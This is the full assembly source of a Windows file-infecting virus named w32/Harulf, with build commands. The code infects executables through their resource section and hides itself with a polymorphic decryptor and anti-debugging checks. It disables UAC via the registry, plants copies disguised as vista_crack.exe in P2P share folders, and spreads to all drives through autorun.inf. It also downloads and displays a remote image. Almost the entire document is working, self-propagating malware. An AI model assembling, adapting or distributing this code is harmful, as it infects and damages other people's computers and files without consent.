;w32/Harulf 
;coded by berniee[fakedminded] 2008
;PE Resource infector (Tested under Vista[Ultimate],XP[sp2]
;Action:
;-Infect Sample.exe in first run
;-Infect exe PE files in current directory and all root
;-Polymorphics decryptor(from 3 decr codes) using Malum VirXasm
;-Second layer static decryptor (xchg(n1,n2) ror(n1,n2))
;-Make the infected file to ask about Admin Privillege
;-Drops autorun.inf and harulf.exe in all disks               > Triggers some AV shit
;-Drops vista_crack.exe into some p2p share folders           >
;-Payload Dowload  and display SF band picture(9/evry month)  >
;-Make the infected file asking for Admin Privilege--> Trys to turn UAC off(vista)
;
;NOTES: (1) Since Resource modifying APis r lame I made lots of exceptions inside infecting routine
;Trying to outbid the file corruption of the victim file,most of these exceptions are:
;.Packed files
;.PE without Resources
;.MSIL files will not get infected coz of LoadLibrary()--see (2)
;....etc
;      (2) Using LoadLibrary() will display messages incase of corrupted PE exe
;
;PEACE
;
;In order to assemble and link use
;ml /c /Cp /coff harulf.asm
;link /subsystem:windows /section:.text,wre harulf.obj






.586
.model flat,stdcall
option casemap:none



include  \masm32\include\windows.inc


vir_size = _end - Start
stub_size = end_decrypt - Start



.Code       
    assume fs:nothing
Start:
jmp stuck
    sig_1 dd 0
    sig_2 dd 0
stuck:
    call @f                 ;Start of antidebugging/delta offset routine
    jmp get_delta
    @@:
    assume fs:nothing
    mov eax,[esp]
    push eax
    push fs:[0]
    mov fs:[0],esp
    xor eax,eax
    mov eax,[eax]
    ret
    get_delta:
    mov eax,[esp+12]       
    mov esp,[eax+184+12]   
    pop fs:[0]
    pop edx
    pop ebp
    sub ebp,offset @b
    add ebp,2h

cmp ebp,0
je end_decrypt
mov esi,offset end_decrypt
add esi,ebp
mov ecx,vir_size
sub ecx,stub_size

_decrypt:   ;                the second decrypting layer (static)
    push ecx
    mov cx,word ptr [esi]
    ror ch,cl
    xchg ch,cl
    mov word ptr [esi],cx
    add esi,2
    pop ecx
    sub ecx,2
    cmp ecx,0
    ja _decrypt
end_decrypt:
    jmp @f
    dump_bytes db 200h dup(0)
    @@:
    xor ebx,ebx
    mov ebx,esp
    sldt word ptr [ebx+8]
    xor eax,eax
    mov eax,dword ptr [ebx+8]
    or eax,eax
    jnz @f
    ret
    @@:

    xor eax,eax
    db 0fh,0a2h
    push eax
    xor eax,eax
    inc eax
    db 0fh,0a2h
    pop ebx
    xor eax,ebx
    or eax,eax
    jnz @f
    ret
    @@:

    call get_kernel       
    call find_main_api
    call find_other_apis
    call polyizer
    call getting_messagebox_api

    mov ebx,dword ptr [ebp+offset old_eip]
    mov edx,dword ptr [ebp+image_base]
    mov dword ptr [ebp+sig_1],ebx
    mov dword ptr [ebp+sig_2],edx

    or ebp,ebp
    jz @f
    add edx,ebx
    mov edi,edx
    lea esi,[ebp+offset dump_bytes]
    mov ecx,200h
    rep movsb
    jmp nxt_gen       ;the first infection only for sample.exe
    @@:
    call @f
    db "sample.exe",0
    @@:
    pop eax
    call nfkt_this
    ret


nxt_gen:
    mov ecx,0ffh
    call rnd_
    mov dword ptr [ebp+offset code1],eax
    call nfkt_exe
    call get_name
    or eax,eax
    jz @f
    call run_expolrer
    call payload2
    call payload3
    call payload3
    call payload4
    ret
    @@:
    call payload1
    call payload2
    call payload3
    call payload3
    call payload4

    or ebp,ebp
    je @f
    mov eax,dword ptr [ebp+sig_1]
    mov ebx,dword ptr [ebp+sig_2]
    add eax,ebx
    jmp eax     ;return to host (no per-process residence)
    @@:

    ret


getting_messagebox_api:

    lea eax,[ebp+offset user32]
    push eax
    call [ebp+offset ALoadLibraryF]
    mov [ebp+offset user32Ad],eax
    lea eax,[ebp+offset MessageBoxN]
    push eax
    push [ebp+offset user32Ad]
    call [ebp+offset AGetProcAddressF]
    mov [ebp+offset MessageBoxAd],eax
ret

;//////////////just chekking procedure(1st launch)


exit:

push 0
call dword ptr [AExitProcessF]


data_needed:
s_g db "w32/Harulf coded by fakedmnded!",0
s_g1 db "E0F-PRojekt",0

MessageBoxN db "MessageBoxA",0
MessageBoxAd dd 0

user32 db "user32.dll",0
user32Ad dd 0
version dd 0


buffer dd 0
;include kernel_procs.asm
;include function_.asm


.code

;///////////////////getting kernel base/////////////
get_kernel:
jmp this_code

kernel_base dd 0

this_code:

mov ecx,[esp+4]

loop_find_kernel:

xor edx,edx
dec ecx
mov dx,[ecx+3ch]
test dx,0f800h
jnz loop_find_kernel

cmp ecx,[ecx+edx+34h]
jnz loop_find_kernel

cmp word ptr [ecx],"ZM"
jne loop_find_kernel

mov [ebp+offset kernel_base],ecx
lrrt:
ret
;/////////////////end getting kernel base///////////////

find_main_api:

jmp finder_data
PE_offset dd 0
Export_address dd 0
Export_size dd 0
Current_kern dd 0
function_no dd 0
function_addr dd 0
function_ord dd 0
function_name dd 0
base_ord dd 0
GetProcAddressF db "GetProcAddress",0
AGetProcAddressF dd 0
GetModuleHandleN db "GetModuleHandleA",0
GetModuleHandleAd dd 0

finder_data:

mov edi,[ebp+offset kernel_base]
add edi,[edi+3ch]      ;just checking
cmp word ptr [edi],"EP"
jne exit

mov dword ptr [ebp+offset PE_offset],edi
mov eax,[edi+78h]      ;export table rva
push eax
mov eax,[edi+7ch]      ;export table size 
mov [ebp+offset Export_size],eax
pop eax
mov [ebp+offset Export_address],eax
add eax,[ebp+offset kernel_base]
mov edx,[eax+16]               ;  ordinal base

add edx,[ebp+offset kernel_base]  
mov [ebp+offset base_ord],edx
mov edx,[eax+24]               ;no. of exported functions
mov [ebp+offset function_no],edx 
mov edx,[eax+28]              ;rva of exported functions
add edx,[ebp+offset kernel_base]
mov [ebp+offset function_addr],edx 
mov edx,[eax+32]              ; rva of exported function name
add edx,[ebp+offset kernel_base]
mov [ebp+offset function_name],edx
mov edx,[eax+36]  ;rva for name ordinal
add edx,[ebp+offset kernel_base]
mov [ebp+offset function_ord],edx
xor edx,edx 
xor eax,eax
mov eax,[ebp+offset function_name] ; getting the GetProcAddress api address
mov edx,offset GetProcAddressF
add edx,ebp
xor ecx,ecx
mov edi,[eax]
add edi,[ebp+offset kernel_base]

loop_search_1:
mov esi,edx
match_byte:

cmpsb
jne Next_one
cmp byte ptr [edi],0
je Got_it
jmp  match_byte

Next_one:
add cx,1
add eax,4

mov edi,[eax]
add edi,[ebp+offset kernel_base]

jmp loop_search_1
jmp exit
Got_it:

mov edi,[eax]
add edi,[ebp+offset kernel_base]
shl ecx,1
mov eax,[ebp+offset function_ord]
add eax,ecx
xor ecx,ecx
mov cx,word ptr [eax]
shl ecx,2
mov eax,[ebp+offset function_addr]
add eax,ecx
mov eax,[eax]
add eax,[ebp+offset kernel_base]
mov [ebp+offset AGetProcAddressF],eax

ret

exit_finder:
mov eax,0

ret


find_other_apis:
jmp fo_code

dll_base dd 0
advapi32N db "advapi32.dll",0
advapi32A dd 0

shel32 db "shell32.dll",0
shel32A dd 0

apis_name:
db "GetLogicalDrives",0
CreateFileF db "CreateFileA",0
CloseHandleF db "CloseHandle",0
WriteFileF db "WriteFile",0
ReadFileF db "ReadFile",0
BeginUpdateResourceF db "BeginUpdateResourceA",0
UpdateResourceF db "UpdateResourceA",0
EndUpdateResourceF db "EndUpdateResourceA",0
FindResourceF db "FindResourceA",0
GetFileSizeF db "GetFileSize",0
GlobalAllocF db "GlobalAlloc",0
SetFilePointerF db "SetFilePointer",0
GetVersionExF db "GetVersionExA",0
GetDateFormatF db "GetDateFormatA",0
SleepF db "Sleep",0
FindFirstFileF db "FindFirstFileA",0
FindNextFileF db "FindNextFileA",0
FindCloseF db "FindClose",0
GetLastError db "GetLastError",0
ExitProcessF db "ExitProcess",0
LoadLibraryF db "LoadLibraryA",0
FreeLibraryF db "FreeLibrary",0
GetEnvironmentVariableF db "ExpandEnvironmentStringsA",0
GetModuleFileNameF db "GetModuleFileNameA",0
CopyFileF db "CopyFileA",0
GetCurrentDirectoryF db "GetCurrentDirectoryA",0
SetCurrentDirectoryF db "SetCurrentDirectoryA",0
GetFileAttributesF db "GetFileAttributesA",0
db "GetTickCount",0
db "WinExec",0

dd 0ffh





apis_address:
AGetLogicalDrivesF dd 0
ACreateFileF dd 0
ACloseHandleF dd 0
AWriteFileF dd 0
AReadFileF dd 0
ABeginUpdateResourceF dd 0
AUpdateResourceF dd 0
AEndUpdateResourceF dd 0
AFindResourceF dd 0
AGetFileSizeF dd 0
AGlobalAllocF dd 0
ASetFilePointerF dd 0
AGetVersionExF dd 0
AGetDateFormatF dd 0
ASleepF dd 0
AFindFirstFileF dd 0
AFindNextFileF dd 0
AFindCloseF dd 0
AGetLastErrorF dd 0
AExitProcessF dd 0
ALoadLibraryF dd 0
AFreeLibraryF dd 0

AGetEnvironmentVariableF dd 0
AGetModuleFileNameF dd 0
ACopyFileF dd 0
AGetCurrentDirectoryF dd 0
ASetCurrentDirectoryF dd 0
AGetFileAttributesF dd 0
AGetTickCountF dd 0
AWinExecF dd 0

dd 0ffh


advapi_api:
RegOpenKeyExF db "RegOpenKeyExA",0
RegQueryValueExF db "RegQueryValueExA",0
RegSetValueExF db "RegSetValueExA",0
RegCloseKeyF db "RegCloseKey",0
dd 0ffh

advapi_addresses:
ARegOpenKeyExF dd 0
ARegQueryValueExF dd 0
ARegSetValueExF dd 0
ARegCloseKeyF dd 0

dd 0ffh

shell_api:
db "IsUserAnAdmin",0
dd 0ffh

shell_addresses:
AIsUserAnAdminF dd 0
dd 0ffh


fo_code:

mov esi,offset apis_name
mov edi,offset apis_address
add esi,ebp
add edi,ebp
push [ebp+offset kernel_base]
pop [ebp+offset dll_base]

call l00p_apis

mov eax,offset advapi32N
add eax,ebp
push eax
call [ebp+offset ALoadLibraryF]
or eax,eax
jz exit
mov [ebp+offset dll_base],eax
mov esi,offset advapi_api
mov edi,offset advapi_addresses
add esi,ebp
add edi,ebp
call l00p_apis

lea eax,[ebp+offset shel32]
push eax
call [ebp+offset ALoadLibraryF]
or eax,eax
jz exit
mov [ebp+offset dll_base],eax
lea esi,[ebp+offset shell_api]
lea edi,[ebp+offset shell_addresses]
call l00p_apis






ret


l00p_apis:
mov eax,esi
push eax
push [ebp+offset dll_base]
call dword ptr[ebp+offset AGetProcAddressF]
or eax,eax
jz exit
mov dword ptr [edi],eax

l00p_small:
inc esi
cmp byte ptr[esi],0
jne l00p_small

next_api_name:
inc esi

add edi,4
cmp dword ptr [edi],0ffh
je finish_fo
jmp l00p_apis
finish_fo:

ret 



;include nfkt.asm


decrypt123:      ;changed with each virus run
    push eax
    call @f
    code1 dd 0ffh
    @@:
    nop
    zygote:
    db 140h dup (90h)

size_shit = $ - offset decrypt123


enc_2:
    mov ecx,vir_size
    mov eax,dword ptr [ebp+offset code1]
    @@:
    xor dword ptr [esi],eax
    inc esi
    loop @b
ret
    
infect :
    jmp nfkt_code
    v_file dd 0
    image_base dd 0
    old_eip dd 0
    temp dd 0
    v_filehandle dd 0
    v_mem dd 0
    v_size dd 0
    bwr dd 0
    w32_data dd 0
    exe_ db "*.*",0
    fexe_handle dd 0
    serch32_data dd 0
    serch_dir db "*.*",0
    serch_dir_handle dd 0
    mark0 dd 0
    vir_ep dd 0

nfkt_code:


nfkt_exe:

    mov eax,sizeof WIN32_FIND_DATA
    push eax
    push 0
    call dword ptr[ebp+offset AGlobalAllocF]
    or eax,eax
    jz exit_nfkt_exe
    mov [ebp+offset w32_data],eax
    push [ebp+offset w32_data]
    mov eax,offset exe_
    add eax,ebp
    push eax
    call dword ptr [ebp+offset AFindFirstFileF]
    cmp eax,INVALID_HANDLE_VALUE
    je exit_nfkt_exe
    mov [ebp+offset fexe_handle],eax
    mov eax,[ebp+offset w32_data]
    add eax,WIN32_FIND_DATA-274
    mov esi,eax
    call size_string
    mov esi,eax
    add esi,ecx
    sub esi,4
    mov edx,dword ptr [esi]
    xor edx,"exe."
    or edx,edx
    jnz _exe_nfkt0r
    call nfkt_this

_exe_nfkt0r:

    push [ebp+offset w32_data]
    push [ebp+offset fexe_handle]
    call [ebp+AFindNextFileF]
    call [ebp+AGetLastErrorF]
    cmp eax,ERROR_NO_MORE_FILES
    je no_more_files
    mov eax,[ebp+offset w32_data]
    add eax,WIN32_FIND_DATA-274
    mov esi,eax
    call size_string
    mov esi,eax
    add esi,ecx
    sub esi,4
    mov edx,dword ptr [esi]
    xor edx,"exe."
    or edx,edx
    jnz _exe_nfkt0r
    call nfkt_this
    jmp _exe_nfkt0r
    no_more_files:
    push [ebp+offset fexe_handle]
    call dword ptr [ebp+offset AFindCloseF]
    exit_nfkt_exe:
ret

find_1st_sec:
    push ebx
    push edx
    mov ebx,dword ptr [ebp+old_eip]
    @ddd:
    xor eax,eax
    mov eax,[edx+0ch] ;V.Address compare with the entry point!
    cmp eax,ebx
    jle @f
    add edx,28h
    jmp @ddd
    @@:
    add eax,[edx+10h];size of raw data
    cmp eax,ebx
    jg found_pointer
    add edx,28h
    jmp @ddd
    found_pointer:
    xchg eax,edx
    pop edx
    pop ebx
    findsectL:
ret

fix_epo:
    mov dword ptr [eax+36],0c0000040h
    
    mov edx,[ebp+offset old_eip]
    sub edx,[eax+0ch]

    mov ecx,[ebp+offset v_mem]
    add ecx,[eax+14h]
    add ecx,edx
    lea edi,[ebp+offset dump_bytes]
    xchg esi,ecx
    mov ecx,dword ptr [ebp+offset code1]
    mov byte ptr [esi],0b8h
    push dword ptr [ebp+offset vir_ep]
    xor dword ptr [esp],ecx
    pop dword ptr [esi+1]
    add esi,5
    lea edi,[ebp+offset decrypt123]
    xchg edi,esi
    mov ecx,size_shit
    rep movsb
    
ret
@t:
popa
jmp exit_nfkt

nfkt_this:

    mov [ebp+offset v_file],eax
    push [ebp+offset v_file]
    call [ebp+offset ALoadLibraryF]
    or eax,eax
    jz exit_nfkt
    mov [ebp+offset bwr],eax
    push RT_RCDATA
    push 1234
    push [ebp+offset bwr]
    call [ebp+offset AFindResourceF]
    or eax,eax
    jnz exit_nfkt
    mov esi,dword ptr [ebp+offset bwr]
    cmp word ptr [esi],"ZM"
    jne exit_nfkt
    add esi,[esi+3ch]
    cmp word ptr [esi],"EP"
    jne exit_nfkt
    cmp dword ptr [esi+136],0
    je exit_nfkt
    mov eax,[esi+40]
    mov ebx,[esi+52]
    mov [ebp+offset image_base],ebx
    mov [ebp+offset old_eip],eax
    push edi
    mov edi,eax
    add edi,[ebp+bwr]
    push esi
    lea esi,dword ptr [ebp+offset dump_bytes]
    xchg esi,edi
    mov ecx,200h
    rep movsb
    pop esi
    pop edi
    xor ecx,ecx
    xor edx,edx
    mov cx,word ptr [esi+6]
    mov dx,word ptr [esi+20]
    add esi,24
    add esi,edx
    pusha
    @@:
    cmp dword ptr [esi+10h],0
    jz @t
    add esi,40
    loop @b
    @@:
    popa
    pusha
    rsr_t:
    cmp dword ptr [esi],"rsr."
    je @f
    add esi,40
    loop rsr_t
    jmp @t
    @@:
    dec ecx
    or ecx,ecx
    jz @f
    jmp @t
    @@:
    popa
    push [ebp+offset bwr]
    call [ebp+offset AFreeLibraryF]

    push vir_size
    push 0
    call dword ptr [ebp+offset AGlobalAllocF]
    or eax,eax
    je exit_nfkt
    mov [ebp+offset v_mem],eax
    mov esi,offset Start
    add esi,ebp
    mov edi,[ebp+offset v_mem]
    mov ecx,vir_size
    rep movsb
    mov ecx,vir_size
    sub ecx,stub_size
    mov eax,[ebp+offset v_mem]
    add eax,stub_size
_encrypt:
    push ecx
    mov cx,word ptr [eax]
    xchg ch,cl
    rol ch,cl
    mov word ptr [eax],cx
    add eax,2
    pop ecx
    sub ecx,2
    cmp ecx,0

    ja _encrypt

    push FALSE
    push [ebp+offset v_file]
    call dword ptr [ebp+offset ABeginUpdateResourceF]
    or eax,eax
    jz exit_nfkt
    push eax
    push vir_size
    push [ebp+offset v_mem]
    push LANG_ENGLISH
    push 1234
    push RT_RCDATA
    push eax
    call dword ptr [ebp+offset AUpdateResourceF]
    or eax,eax
    jz exit_nfkt
    pop eax
    push FALSE
    push eax
    call dword ptr [ebp+AEndUpdateResourceF]
    or eax,eax
    jz exit_nfkt

    xor eax,eax
    push eax
    push eax
    push 3
    push eax
    push 2h
    push 40000000h or 80000000h
    push [ebp+offset v_file]
    call dword ptr [ebp+offset ACreateFileF]
    or eax,eax
    jz exit
    mov [ebp+offset v_filehandle],eax
    push 0
    push eax
    call dword ptr [ebp+offset AGetFileSizeF]
    or eax,eax
    jz exit_nfkt
    mov dword ptr [ebp+offset v_size ],eax
    push eax
    push 0
    call dword ptr [ebp+offset AGlobalAllocF]
    or eax,eax
    jz exit_nfkt
    mov dword ptr [ebp+offset v_mem],eax
    push 0
    mov eax,offset bwr
    add eax,ebp
    push eax
    push dword ptr [ebp+offset v_size]
    push dword ptr [ebp+offset v_mem]
    push dword ptr  [ebp+offset v_filehandle]
    call dword ptr [ebp+offset AReadFileF]
    or eax,eax
    jz exit_nfkt
    mov esi,dword ptr [ebp+offset v_mem]
    cmp word ptr [esi],"ZM"
    jne exit_nfkt
    add esi,[esi+3ch]
    cmp word ptr [esi],"EP"
    jne exit_nfkt
    push esi
    xor ecx,ecx
    xor ebx,ebx
    mov bx,word ptr [esi+20] ;ebx size of optional header
    mov cx,word ptr [esi+6]  ;ecx no. of sections
    add esi,24
    add esi,ebx
    mov edx,esi
    push esi
    push ecx
    call find_1st_sec
    mov dword ptr [ebp+offset temp],eax
    pop ecx
    pop esi
    xor ebx,ebx
    l00p_rsrc:
    cmp dword ptr [esi],"rsr."
    je found_rsrc
    add esi,40
    loop l00p_rsrc
    jmp exit_nfkt
    found_rsrc:
    mov dword ptr [esi+36],0c0000040h
    mov ecx,[esi+16]
    mov esi,[esi+20]
    add esi,[ebp+offset v_mem]
    push ecx
    l00p_marker:
    mov edx,dword ptr [ebp+offset Start]
    cmp dword ptr [esi],edx
    je here_vir
    inc esi
    loop l00p_marker
    here_vir:
    pusha
    call enc_2
    popa
    pop edx
    sub edx,ecx
    pop edi
    add edx,dword ptr [edi+136]
    add edx,dword ptr [edi+34h]
    mov dword ptr [ebp+offset vir_ep],edx
    mov eax,dword ptr [ebp+offset temp]
    call fix_epo
    push 0
    push 0
    push FILE_BEGIN
    push dword ptr [ebp+offset v_filehandle]
    call dword ptr [ebp+offset ASetFilePointerF]
    push 0
    mov eax,offset bwr
    add eax,ebp
    push eax
    push dword ptr [ebp+offset v_size]
    push dword ptr [ebp+offset v_mem]
    push dword ptr  [ebp+offset v_filehandle]
    call dword ptr [ebp+offset AWriteFileF]

ret

exit_nfkt:

ret

;include payloads.asm


;the following will contain the payloads(4) code and some other codes needed by the virus
;---------------------------------------------------------------------------------------

warning_t db "You need Administrator Privilege to run this Application",0
warning_c db "Error",0
vista_api db "InitializeSRWLock",0

payload1:             ;demanding for admin privileges
call [offset AIsUserAnAdminF+ebp]
or eax,eax
jnz @f
lea eax,[offset warning_t+ebp]
lea edx,[offset warning_c+ebp]
push MB_ICONERROR
push edx
push eax
push 0
call [MessageBoxAd+ebp]
ret
@@:
lea eax,[offset vista_api+ebp]
push eax
push [offset kernel_base+ebp]

call dword ptr [ebp+offset AGetProcAddressF]
or eax,eax       ;Are we on Vista
jz @f
call fix_vista
ret
@@:
ret
LUA db "Software\Microsoft\Windows\CurrentVersion\Policies\System",0
valuename db "EnableLUA",0

sz_key dd 04h
value dd 0
reg_handle dd 0

fix_vista:
;change Registry -- disabling LUA

lea eax,[offset reg_handle+ebp]
push eax
push KEY_SET_VALUE
push 0
lea eax,[offset LUA+ebp]
push eax
push HKEY_LOCAL_MACHINE
call dword ptr [ebp+offset ARegOpenKeyExF]

cmp reg_handle,0
je @f
push [ebp+offset sz_key]
lea eax,[ebp+offset value]
push eax
push REG_DWORD
push 0
lea eax,[ebp+offset valuename]
push eax
push [ebp+offset reg_handle]
call [ebp+offset ARegSetValueExF]

push dword ptr [ebp+offset reg_handle]
call dword ptr [ebp+offset ARegCloseKeyF]

@@:
ret



URL db "http://www.saddamsfamily.com/sf-logony.jpg",0
d_f db "c:\saddamsfamily.jpg",0
e_this db 'explorer.exe "c:\saddamsfamily.jpg"',0

url_f db "URLDownloadToFileA",0
url_l db "urlmon.dll",0
LBP dd 0
buftime db 4 dup (0)
tmformat db "dd",0

payload2:             ;download saddams family picture and display on 9th of every month
push 4
lea eax,[ebp+offset buftime]
push eax
lea eax,[ebp+offset tmformat]
push eax
xor eax,eax
push eax
push eax
push eax
call [AGetDateFormatF+ebp]
lea eax,[ebp+offset buftime]
cmp word ptr [eax],'90'
jne @f
lea eax,[offset url_l+ebp]
push eax
call dword ptr [ebp+offset ALoadLibraryF]
or eax,eax
jz @f
lea edx,[offset url_f+ebp]
push edx
push eax
call dword ptr [ebp+offset AGetProcAddressF]


xor edx,edx

push edx
push edx
lea ebx,[ebp+offset d_f]
push ebx
lea ebx,[ebp+offset URL]
push ebx
push edx
call eax
push 3000
call [ebp+offset ASleepF]

push SW_SHOW
lea eax,[ebp+offset e_this]
push eax
call dword ptr [ebp+offset AWinExecF]
@@:
ret


drop:
db "c:\Program Files\Kazaa Lite\My Shared Folder\vista_crack.exe",0
db "c:\Program Files\Kazaa\My Shared Folder\vista_crack.exe",0
db "c:\Program Files\Edonkey2000\Incoming\vista_crack.exe",0
db "c:\Program Files\Icq\Shared Files\vista_crack.exe",0
db "c:\Program Files\emule\incoming\vista_crack.exe",0
db "c:\Program Files\Gnucleus\Downloads\Incoming\vista_crack.exe",0
db "c:\Program Files\KMD\My Shared Folder\vista_crack.exe",0
db "c:\Program Files\Limewire\Shared\vista_crack",0
;their_size = $-drop


payload3:        ;drop in p2p default (harcoded) share folders

lea esi,[ebp+offset drop]
push 8;their_size
pop ecx

drop_em:
push ecx
push esi
push FALSE
push esi
push dword ptr [ebp+offset c_file_name]
call dword ptr [ebp+offset ACopyFileF]
pop esi
@@:
cmp byte ptr [esi],0
jz @f
inc esi
jmp @b
@@:
inc esi
pop ecx
loop drop_em

ret

root db "a:\",0

payload4:          ;drop an autorun with 'harulf.exe' on every writeable drive
call dword ptr [ebp+offset AGetLogicalDrivesF]
xor edx,edx

lea edx,[ebp+offset root]
xor ecx,ecx
btest:
bt eax,ecx
jnc @f
pusha 
call drop_n_nfkt
popa

@@:
inc byte ptr [edx]
inc ecx
cmp ecx,33
ja @f
jmp btest
@@:
ret

inf_file db "[autorun]",13,10,"open=harulf.exe",13,10,"shell\open\command=harulf.exe",13,10,"shell\open\default=1",0
auto_file db "autorun.inf",0

drop_file db "\harulf.exe",0

c_d_buf dd 0

drop_n_nfkt:
push 256 
push 0
call [ebp+offset AGlobalAllocF]
mov [ebp+offset c_d_buf],eax

push [ebp+offset c_d_buf]
push 256
call dword ptr [ebp+offset AGetCurrentDirectoryF]

lea esi,[ebp+offset root]
push esi
call [ebp+offset ASetCurrentDirectoryF]

call nfkt_exe

push FALSE
lea eax,[ebp+offset drop_file]
push eax
push [ebp+offset c_file_name]
call [ebp+offset ACopyFileF]

xor eax,eax
push eax
push eax
push 2
push eax
push eax
push 40000000h
lea eax,[ebp+offset auto_file]
push eax
call dword ptr [ebp+offset ACreateFileF]
push eax
push 0
mov edx,esp
push 0
push edx
push (sizeof inf_file)
lea edx,[ebp+offset inf_file]
push edx
push eax
call [AWriteFileF+ebp]
pop eax
call dword ptr [ebp+offset ACloseHandleF]
push [ebp+offset c_d_buf]
call [ebp+offset ASetCurrentDirectoryF]


ret


c_file_name dd 0

get_name:
push 256
push 0
call dword ptr [ebp+offset AGlobalAllocF]
mov [ebp+offset c_file_name],eax

push 256
push dword ptr [ebp+offset c_file_name]
push 0
call [ebp+offset AGetModuleFileNameF]

mov esi,[ebp+offset c_file_name]
push esi
call size_string
pop esi

add esi,ecx
mov ecx,8
xor eax,eax
@@:
dec esi
cmp word ptr [esi],"urah";harulf
je @f
loop @b
ret
@@:
dec eax

ret



cmd db "explorer ",0

run_expolrer:
lea esi,[ebp+offset cmd]
mov edi,esp
sub edi,512
push edi
mov ecx,(sizeof cmd)-1
rep movsb
mov ecx,2
mov esi,[ebp+offset c_file_name]
rep movsb
mov byte ptr [edi+1],0

mov ecx,(sizeof cmd)+1
push ecx
push ecx
push 0
call [AGlobalAllocF]
pop ecx
pop esi
mov edi,eax
rep movsb
push SW_SHOW
push eax
call [ebp+offset AWinExecF]

ret


size_string:
    xor ecx,ecx
    loop_size:
    cmp byte ptr [esi],0
    je sized
    inc esi
    inc ecx
    jmp loop_size
    sized:
ret

rnd_:
    inc ecx
    push ecx
    call [AGetTickCountF+ebp]
    mov ecx,eax
    RDTSC
    xor ecx,eax
    xchg ecx,eax
    pop ecx
    @2:
    push ecx
    xor edx,edx
    div ecx
    xchg edx,eax
    pop ecx
    cmp eax,ecx
    ja @2
    cmp eax,0
    ja @w
    xchg eax,edx
    jmp @2
    @w:
    ret


;-----------polymorphic engine

 ;   include    virxasm32a.inc
 
; Autogenerated file
; VirXasm32 v1.5 edit A (with data between code)
; Size: 333 bytes
; (X) Malum

VirXasm32:
db 060h, 083h, 0ECh, 06Eh, 0FCh, 089h, 0E7h, 056h
db 0E8h, 03Bh, 000h, 000h, 000h, 058h, 0EAh, 011h
db 000h, 03Eh, 0F3h, 0B1h, 0BFh, 080h, 00Bh, 0ACh
db 0B0h, 019h, 054h, 011h, 00Ch, 00Ah, 0FFh, 0FFh
db 0F3h, 0F3h, 088h, 00Fh, 05Fh, 055h, 055h, 05Dh
db 00Dh, 055h, 0FFh, 005h, 0D0h, 001h, 004h, 010h
db 055h, 007h, 00Dh, 0C4h, 00Eh, 00Fh, 0A0h, 07Fh
db 0FFh, 0F8h, 0F8h, 0FFh, 0FFh, 0FFh, 055h, 0FFh
db 0FFh, 0FFh, 0FFh, 001h, 001h, 010h, 010h, 015h
db 05Bh, 08Dh, 073h, 00Dh, 06Ah, 064h, 059h, 00Fh
db 0A3h, 00Bh, 0D6h, 073h, 001h, 0ACh, 0AAh, 0E2h
db 0F6h, 05Eh, 06Ah, 002h, 05Bh, 089h, 0DAh, 0ACh
db 050h, 050h, 03Ch, 066h, 00Fh, 044h, 0D9h, 03Ch
db 067h, 00Fh, 044h, 0D1h, 03Ch, 0EAh, 074h, 005h
db 03Ch, 09Ah, 075h, 005h, 046h, 08Dh, 074h, 01Eh
db 003h, 03Ch, 0C8h, 074h, 006h, 024h, 0F7h, 03Ch
db 0C2h, 075h, 002h, 046h, 046h, 024h, 0E7h, 03Ch
db 026h, 058h, 074h, 014h, 03Ch, 0F1h, 074h, 00Eh
db 024h, 0FCh, 03Ch, 0A0h, 075h, 004h, 08Dh, 074h
db 016h, 002h, 03Ch, 0F0h, 074h, 002h, 03Ch, 064h
db 058h, 074h, 0BCh, 089h, 0E7h, 052h, 050h, 03Ch
db 00Fh, 075h, 001h, 0ACh, 09Ch, 0D4h, 010h, 086h
db 0CCh, 098h, 099h, 031h, 0EDh, 09Dh, 075h, 016h
db 083h, 0C7h, 035h, 0E3h, 00Dh, 00Fh, 0A3h, 02Fh
db 073h, 001h, 042h, 045h, 0E2h, 0F7h, 072h, 002h
db 0D6h, 099h, 0D1h, 0E2h, 0EBh, 018h, 080h, 0E9h
db 004h, 079h, 004h, 0B1h, 00Ch, 024h, 007h, 0E3h
db 00Bh, 080h, 0D2h, 001h, 045h, 00Fh, 0A3h, 02Fh
db 0E2h, 0F7h, 072h, 002h, 0D0h, 0E8h, 086h, 0C8h
db 08Dh, 014h, 0D1h, 059h, 05Dh, 00Fh, 0A3h, 057h
db 002h, 073h, 03Bh, 0ACh, 0D4h, 008h, 0C0h, 0E4h
db 004h, 073h, 002h, 078h, 01Fh, 09Ch, 085h, 0EDh
db 075h, 006h, 02Ch, 006h, 075h, 009h, 0B0h, 005h
db 03Ch, 004h, 075h, 003h, 0ACh, 024h, 007h, 09Dh
db 072h, 006h, 078h, 007h, 03Ch, 005h, 075h, 004h
db 001h, 0EEh, 046h, 046h, 0F6h, 0C4h, 060h, 075h
db 00Dh, 091h, 03Ch, 0F6h, 074h, 007h, 03Ch, 0F7h
db 075h, 004h, 001h, 0DEh, 046h, 046h, 0D1h, 0E2h
db 00Fh, 0A3h, 057h, 013h, 073h, 00Ah, 042h, 00Fh
db 0A3h, 057h, 013h, 073h, 002h, 011h, 0DEh, 046h
db 083h, 0C4h, 06Eh, 02Bh, 074h, 024h, 004h, 089h
db 074h, 024h, 01Ch, 061h, 0C3h

    krkt_lp1 dd 0
    krkt_lp2 dd 0


polyizer:
    mov dword ptr [ebp+offset krkt_lp1],0
    mov dword ptr [ebp+offset krkt_lp2],0
    lea esi,dword ptr [ebp+zygote]
    mov ecx,120h
    push esi
    @@:
    xor edx,edx
    mov dword ptr[esi],edx
    inc esi
    loop @b
    pop edi
    lea eax,dword ptr [ebp+offsets]
    mov ecx,2

    xor ecx,ecx
    mov ecx,9
    p_:
    push ecx
    call decide_
    mov esi,edx
    mov ebx,9
    sub ebx,ecx
    xchg ecx,ebx
    call seek_order
    push esi
    call VirXasm32
    mov ebx,eax
    add esi,eax
    call VirXasm32
    add ebx,eax
    cmp dword ptr [esp+4],5
    jb @f
    add dword ptr [ebp+offset krkt_lp1],ebx
    jmp p2
    @@:
    cmp dword ptr [esp+4],3
    jb p2
    add dword ptr [ebp+offset krkt_lp2],ebx
    p2:
    xchg ecx,ebx
    pop esi
    rep movsb
    pop ecx
    loop p_
    lea eax,[ebp+offset zygote]
    add eax,dword ptr [ebp+offset krkt_lp1]
    add eax,dword ptr [ebp+offset krkt_lp2]
    inc eax
    mov ebx,dword ptr [ebp+offset krkt_lp2]
    inc ebx
    not bl
    mov byte ptr [eax],bl

ret

seek_order:
    xor ebx,ebx
    or ecx,ecx
    jz exit_sk
    @@:
    call VirXasm32
    add ebx,eax
    add esi,eax
    call VirXasm32
    add ebx,eax
    add esi,eax
    dec ecx
    or ecx,ecx
    jnz @b
    exit_sk:
    ret

  offsets:
    dd 0
